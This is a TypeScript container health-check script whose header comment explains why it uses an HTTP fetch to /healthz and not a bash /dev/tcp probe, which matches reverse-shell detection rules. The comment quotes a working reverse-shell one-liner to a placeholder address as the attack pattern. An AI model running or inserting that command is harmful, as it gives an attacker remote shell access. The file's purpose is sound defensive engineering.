/**
 * healthcheck.ts — the container readiness probe, and why it is a node script.
 *
 * DO NOT REPLACE THIS WITH `bash -c '< /dev/tcp/127.0.0.1/9900'`
 * -------------------------------------------------------------
 * That line is the conventional answer for a container with no curl, it is all
 * over Stack Overflow and production Dockerfiles, and it is byte-for-byte the
 * construct every reverse-shell detection rule in the industry is written
 * against. It is not a false positive when a sensor flags it: the rule watches
 * for a process wiring one of its own standard streams to a network connection
 * instead of a terminal, and `< /dev/tcp/host/port` is exactly that — bash
 * opening a TCP socket and handing it to the shell as standard input. Aqua's
 * Tracee publishes it as TRC-101; GuardDuty, Google SCC and Sysdig describe the
 * same shape. The only difference between the probe and the attack
 * (`bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`) is the destination, and a
 * signature cannot be written on a destination.
 *
 * Asking the detector to look away from bash in containers is the wrong fix.
 * The probe is the part we own, so the probe is what changes. See
 * "The Health Check Was a Reverse Shell" on fblln.github.io for the long
 * version, including how a suppression rule quietly costs you the detector's
 * attack-sequence correlation.
 *
 * WHAT THIS DOES INSTEAD
 * ----------------------
 * An ordinary HTTP request, from the runtime the image already ships, named in
 * an exec-form `HEALTHCHECK` so no shell is involved at all. It also proves
 * MORE than the redirection did: a listening port only means something bound a
 * socket, while a 200 from `/healthz` means a server parsed a request and
 * answered it. "Listening" and "ready" are different states, and the gap
 * between them is where the flaky-test hunt that started all this began.
 *
 * For an image with a runtime but no HTTP client — the Postgres container here
 * — the probe to reach for is a `/proc/net/tcp` grep in exec form (see
 * compose.yaml). Reading a file is not opening a socket, and every Linux
 * container has /proc whatever else was stripped.
 */

const url = process.env['HEALTHCHECK_URL'] ?? `http://127.0.0.1:${process.env['PORT'] ?? '9900'}/healthz`;

try {
  const res = await fetch(url, { signal: AbortSignal.timeout(2_000) });
  if (!res.ok) {
    console.error(`healthcheck: ${url} returned ${res.status}`);
    process.exit(1);
  }
  process.exit(0);
} catch (error) {
  console.error(`healthcheck: ${url} unreachable: ${String(error)}`);
  process.exit(1);
}
